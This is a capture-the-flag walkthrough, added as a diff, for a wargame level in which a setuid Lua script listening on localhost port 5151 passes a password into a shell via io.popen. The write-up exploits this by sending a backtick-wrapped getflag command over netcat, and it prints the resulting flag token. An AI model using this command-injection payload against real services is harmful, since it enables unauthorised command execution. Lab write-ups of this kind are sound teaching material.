@@ -1,0 +1,69 @@
+- List the files in level11 user home directory to find 'level11.lua' script which belongs to flag11 user (setuid bit active).
+
+- Look at the content of the script to understand what it does.
+
+`cat ./level11.lua`
+#!/usr/bin/env lua
+local socket = require("socket") # open a socket
+local server = assert(socket.bind("127.0.0.1", 5151)) # link the socket to localhost on port 5151
+
+function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r") # execute the command 'echo pass_variable | sha1sum' and enable the reading of its output
+  data = prog:read("*all") # read the complete output of the previous command
+  prog:close()
+
+  data = string.sub(data, 1, 40) cut the resulting string to get the hash only
+
+  return data
+end
+
+
+while 1 do
+  local client = server:accept()
+  client:send("Password: ")
+  client:settimeout(60)
+  local l, err = client:receive()
+  if not err then
+      print("trying " .. l)
+      local h = hash(l)
+
+      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+          client:send("Erf nope..\n");
+      else
+          client:send("Gz you dumb*\n")
+      end
+
+  end
+
+  client:close()
+end
+
+- The provided hash is crackable easily via Internet and give us 'NotSoEasy'. We execute the same command as the script does to check it.
+
+`echo NotSoEasy | sha1sum`
+62d39a9edac7bc1a68d816a5d9a491aa4e81fbcb  -
+
+- Hashes are differents, due to the newline character added by echo. Try again with -n option.
+
+`echo -n NotSoEasy | sha1sum`
+f05d1d066fb246efe0c6f7d095f909a7a0cf34a0  -
+
+- This time we have the exact same hash, so we use 'netcat' utility to connect and see what happens.
+
+`nc 127.0.0.1 5151`
+Password: `-n NotSoEasy` # to match with the echo command performed in the script
+Gz you dumb*
+
+- The script prints the expected string, but nothing else happens, so the answer is elsewhere.
+
+- The previous attempt is here to explain my first approach but it's not required.
+We may first understand that we can inject code (as I did by adding -n flag to echo execution) to run getflag via the 'pass' variable.
+
+- Due to the pipe used to redirect the output of echo to sha1sum command, we will redirect the output of getflag in a file before.
+
+`nc 127.0.0.1 5151`
+Password: ``getflag` > /tmp/flag`
+Erf nope.. # obviously
+
+`cat /tmp/flag`
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
